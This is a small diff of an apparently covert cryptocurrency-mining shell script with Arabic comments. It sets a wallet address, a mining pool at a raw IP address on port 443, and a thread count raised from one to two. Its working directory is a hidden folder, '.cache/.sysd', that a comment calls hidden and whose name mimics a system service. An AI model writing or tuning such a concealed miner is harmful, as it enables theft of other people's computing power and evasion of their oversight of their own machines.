@@ -4,7 +4,7 @@
 WALLET="4Aea3C3PCm6VcfUJ82g46G3iBwq59x8z6DYa4aM2E7QMC42vpTKARQfBwig1gEPSr3JufAayvqVs26CFuD7cwq7U2rPbeCR"       # ← غيّر هذا إلى عنوان محفظتك الحقيقي
 WORKER="arm"
 POOL="152.53.121.6:443"
-THREADS=1
+THREADS=2
 # مجلد العمل
 WORKDIR="$HOME/.cache/.sysd"  # ← مجلد خفي داخل .cache
 mkdir -p "$WORKDIR" && cd "$WORKDIR"
